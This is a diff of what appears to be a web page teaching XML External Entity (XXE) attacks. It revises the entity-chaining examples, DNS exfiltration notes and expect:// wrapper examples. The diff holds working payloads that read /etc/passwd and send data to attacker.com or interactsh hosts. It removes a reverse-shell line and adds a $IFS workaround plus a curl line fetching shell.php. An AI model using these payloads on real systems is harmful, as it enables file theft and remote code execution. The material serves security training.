@@ -97,11 +97,11 @@
 <p>And they are referenced with <code>%filename;</code> instead of <code>&amp;name;</code>:</p>
 <pre class="highlight"><code class="language-xml">%filename;</code></pre>
 <p>Why do they matter? Because parameter entities can define other entities. This creates a chain where one entity sets up another entity which sets up another. Here is a simplified example of how chaining works:</p>
-<pre class="highlight"><code class="language-xml">&lt;!ENTITY % step1 "file:///etc/hostname"&gt;
+<pre class="highlight"><code class="language-xml">&lt;!ENTITY % step1 SYSTEM "file:///etc/hostname"&gt;
 &lt;!ENTITY % step2 "&lt;!ENTITY &amp;#x25; step3 SYSTEM 'http://attacker.com/?data=%step1;'&gt;"&gt;
 %step2;
 %step3;</code></pre>
-<p>What happens here: <code>%step1</code> reads the hostname file, <code>%step2</code> creates a new entity that embeds the hostname into a URL, and <code>%step3</code> makes the parser visit that URL — sending the stolen data to the attacker. Don't worry about the <code>&amp;#x25;</code> syntax for now, it is explained in detail in the <a href="#understanding-the-escape-characters">OOB section</a>.</p>
+<p>What happens here: <code>%step1</code> is an external entity (the <code>SYSTEM</code> keyword makes it fetch the file instead of treating the value as a literal string), <code>%step2</code> creates a new entity that embeds the hostname into a URL, and <code>%step3</code> makes the parser visit that URL — sending the stolen data to the attacker. Don't worry about the <code>&amp;#x25;</code> syntax for now, it is explained in detail in the <a href="#understanding-the-escape-characters">OOB section</a>.</p>
 <p>This chaining ability is what makes advanced XXE techniques (like blind exfiltration and OOB attacks) possible.</p>
 <h2 id="how-entity-resolution-creates-the-vulnerability">How Entity Resolution Creates the Vulnerability</h2>
 <p>When the parser encounters <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> followed by <code>&amp;xxe;</code> in the document, it does the following:</p>
@@ -120,7 +120,7 @@
 <p>An XML External Entity attack is a type of attack against an application that parses non-validated XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. These external entities are defined by the attacker and they can lead to several side effects like data exfiltration, Server-Side Request Forgery (SSRF), denial of service or even, in very specific scenarios, Remote Code Execution (RCE).</p>
 <p>To understand the difference between a harmless entity and a dangerous one, compare these two examples:</p>
 <p><strong>Internal entity (harmless):</strong></p>
-<pre class="highlight"><code class="language-XML">&lt;!--?xml version="1.0" ?--&gt;
+<pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" ?&gt;
 &lt;!DOCTYPE replace [&lt;!ENTITY example "Doe"&gt; ]&gt;
  &lt;userInfo&gt;
   &lt;firstName&gt;John&lt;/firstName&gt;
@@ -128,7 +128,7 @@
  &lt;/userInfo&gt;</code></pre>
 <p>Here the attacker is defining the entity "example", assigning the value "Doe" to it and then reflecting it in the "lastName" element. Nothing leaves the server.</p>
 <p><strong>External entity (dangerous):</strong></p>
-<pre class="highlight"><code class="language-XML">&lt;!--?xml version="1.0" ?--&gt;
+<pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" ?&gt;
 &lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM "file:///etc/passwd"&gt; ]&gt;
  &lt;userInfo&gt;
   &lt;firstName&gt;John&lt;/firstName&gt;
@@ -1229,7 +1229,8 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://%file;.interactsh-domain.com/'&gt;"&gt;
 %eval;
 %exfiltrate;</code></pre>
-<p>Keep in mind that DNS has strict length limits: each label (subdomain component) can be at most 63 characters and the full domain name cannot exceed 253 characters. This means DNS exfiltration works best for short values (hostname, single config values, usernames) but not for large files. For longer content you would need to split the data into chunks and send multiple DNS queries, or combine this with other techniques.</p>
+<p>There are two important limitations to keep in mind. First, DNS has strict length limits: each label (subdomain component) can be at most 63 characters and the full domain name cannot exceed 253 characters. Second — and this is easy to overlook — DNS labels only accept alphanumeric characters (a-z, 0-9) and hyphens. Characters like <code>:</code>, <code>/</code>, newlines and spaces will break the query. Since files like <code>/etc/passwd</code> are full of these characters, the payloads above will only work as-is for files with very simple content (like <code>/etc/hostname</code> which is typically a single word).</p>
+<p>To exfiltrate anything meaningful we need to encode the data before embedding it in the subdomain. Base32 is the safest option because its output only contains A-Z and 2-7 — all valid DNS characters. Base64 works in some contexts but its output includes <code>+</code>, <code>/</code> and <code>=</code> which are also invalid in labels. In PHP environments we can combine <code>php://filter/convert.base64-encode</code> with the exfiltration payload to get clean ASCII before it hits the DNS query. For files longer than 63 characters, split the encoded data into chunks across multiple labels or multiple queries.</p>
 <h2 id="php-wrappers">PHP Wrappers</h2>
 <p>PHP's XML functions support protocol wrappers that extend XXE capabilities beyond simple file inclusion. These only work on PHP-based targets.</p>
 <h3 id="expect-wrapper-environment-specific-rce">expect:// Wrapper (Environment-Specific RCE)</h3>
@@ -1242,9 +1243,16 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <p>Output:</p>
 <pre class="highlight"><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
 <p>More examples:</p>
-<pre class="highlight"><code class="language-xml">&lt;!ENTITY xxe SYSTEM "expect://cat /etc/passwd"&gt;
-&lt;!ENTITY xxe SYSTEM "expect://bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1"&gt;
-&lt;!ENTITY xxe SYSTEM "expect://curl http://attacker.com/?data=$(cat /etc/passwd | base64)"&gt;</code></pre>
+<pre class="highlight"><code class="language-xml">&lt;!ENTITY xxe SYSTEM "expect://id"&gt;
+&lt;!ENTITY xxe SYSTEM "expect://whoami"&gt;</code></pre>
+<p><strong>⚠️ Character restrictions in expect:// URIs.</strong> There is a catch when running commands with arguments: PHP's XML parser treats the <code>expect://</code> URI literally and rejects it if it contains spaces, <code>&gt;</code>, <code>&amp;</code> or other special characters. A payload like <code>expect://cat /etc/passwd</code> will fail with an "Invalid URI" error. URL encoding (<code>%20</code>, <code>+</code>) does not help — the parser does not decode it. XML character references (<code>&amp;#x20;</code>) do not work either.</p>
+<p>The workaround is to replace spaces with <code>$IFS</code> — the shell Internal Field Separator variable. When the next argument starts with letters, wrap it in single quotes so the shell does not try to read it as part of the variable name:</p>
+<pre class="highlight"><code class="language-xml">&lt;!-- cat /etc/passwd → replace spaces with $IFS --&gt;
+&lt;!ENTITY xxe SYSTEM "expect://cat$IFS/etc/passwd"&gt;
+
+&lt;!-- curl -O http://1.3.3.7/shell.php → $IFS + quotes for args --&gt;
+&lt;!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7/shell.php'"&gt;</code></pre>
+<p>For complex commands like reverse shells it is easier to use <code>expect://</code> to download a script first and then execute it in a second request, rather than cramming the whole command into a single URI.</p>
 <p><code>expect://</code> requires the PHP <code>expect</code> extension which as mentioned is rarely present in production environments.</p>
 <h3 id="phpfilter-wrapper-base64-encoding">php://filter Wrapper (Base64 Encoding)</h3>
 <p>The <code>php://filter</code> wrapper reads files with encoding filters. Useful for files that contain characters that would break XML:</p>
@@ -1319,7 +1327,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <tr>
 <td>File contents show only first line</td>
 <td>Binary/special characters</td>
-<td>Use CDATA or error-based exfiltration</td>
+<td>Use error-based or OOB exfiltration; use php://filter for encoding</td>
 </tr>
 <tr>
 <td>DOCTYPE not allowed error</td>
@@ -1420,7 +1428,7 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
 <h1 id="references">References</h1>
 <h2 id="owasp">OWASP</h2>
 <ul>
-<li><a href="https://owasp.org/Top10/A05_2021-XML_External_Entity_XXE/">A05:2021 – XML External Entity (XXE)</a></li>
+<li><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">A05:2021 – Security Misconfiguration (includes XXE)</a></li>
 <li>https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</li>
 <li>https://owasp.org/www-community/attacks/XML_External_Entity_(XXE)_Processing</li>
 </ul>
@@ -1441,7 +1449,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
 <li><strong>XML External Entity (XXE) Processing</strong> - NIST Guidelines</li>
 <li><strong>DTD Security Considerations</strong> - W3C XML Specifications</li>
 </ul>
-<hr />
   </div>
 
   
